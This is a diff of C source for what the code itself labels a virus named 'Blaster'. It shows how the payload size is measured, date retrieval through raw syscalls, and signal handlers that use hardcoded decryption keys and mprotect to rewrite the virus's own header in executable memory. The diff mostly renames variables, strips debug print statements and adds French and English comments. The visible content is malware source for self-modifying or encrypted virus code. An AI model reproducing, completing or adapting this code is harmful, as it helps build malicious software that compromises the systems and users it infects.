@@ -3,15 +3,19 @@
 void		Main_Blaster ( void ) {
 
 	/* -- Get size of viruses. (PAYLOAD) -- */
-	uint32_t 	size = ((uint32_t)&Blaster_end - (uint32_t)&VIRUSE_HEADER);	
-	unsigned char	*p = (unsigned char*)&Blaster_end;
-	for( ; ; ++p, ++size)
-		if (*p == 0XC3) { ++size; break; }
+	uint32_t 	size_viruse = ((uint32_t)&Blaster_end - (uint32_t)&VIRUSE_HEADER);		
+	char	*addr = (char*)&Blaster_end;
+	for( ; (unsigned char)*addr != RET ; ++addr, ++size_viruse)
+		;
 
-	/* -- Get size of loader. -- */
+
+
+	// -- Get size of loader. -- //
 	uint32_t	__attribute__((unused)) size_loader = ((uint32_t)&Main_Blaster - (uint32_t)&loader);
 
-	/* -- Get date -- */
+
+
+	// -- Get date -- //
 	struct timeval __attribute__((unused))tv = {0};
 	if ( Syscall2( __NR_gettimeofday, (long) &tv, 0 ) != 0) {
 
@@ -40,6 +44,7 @@ void		Main_Blaster ( void ) {
 	}*/
 }
 
+
 void 	security_viruse (int __attribute__((unused))sig) {
 	
 	t_header	*header = NULL;
@@ -57,6 +62,7 @@ void 	security_viruse (int __attribute__((unused))sig) {
 		(unsigned char[0X10]){0X53,0X2A,0XE1,0XD3,0X0A,0X2E,0X87,0XB9,0X40,0X0B,0X36,0X54,0XDD,0X01,0XE0,0XEE},
 		(unsigned char[0X10]){0XCF,0X71,0XC1,0X3E,0X94,0XA1,0X69,0XDE,0X44,0XB3,0X1A,0X3B,0X0D,0X28,0X1D,0XC4},
 	};
+
 	switch(sig) {
 
 		case SIGUSR1:
@@ -99,7 +105,10 @@ void 	security_viruse (int __attribute__((unused))sig) {
 
 		case SIGINT:
 			// -- [FR] Ce code ci-dessus change la façon dont le décryptage fonctionne -- //
+			// -- [FR] Cette portion de code ne s'active qu'une seule fois. -- //
+
 			// -- [EN] This code above changes the way the decryption works -- //
+			// -- [EN] This part of the code is activated only once -- //
 			addr -= sizeof(t_header);
 			header = (t_header *)addr;
 			Syscall3( __NR_mprotect, (long)address_header, 0X1000, PROT_READ | PROT_WRITE | PROT_EXEC);
@@ -112,14 +121,10 @@ void 	security_viruse (int __attribute__((unused))sig) {
 		case SIGSEGV:
 			addr -= sizeof(t_header);
 			header = (t_header *)addr;
-			for(int i=0; i<16; i++) {
-				printf("%.2X ", (unsigned char)keys[header->pos][i]);
-			}
-			printf("\n");
 
 			Syscall3( __NR_mprotect, (long)address_header, 0X1000, PROT_READ | PROT_WRITE | PROT_EXEC);
 			++header->pos;
-			printf("%.2x\n", (unsigned char)header->pos);
+
 			Syscall3( __NR_mprotect, (long)address_header, 0X1000, PROT_READ | PROT_EXEC);
 			break;
 
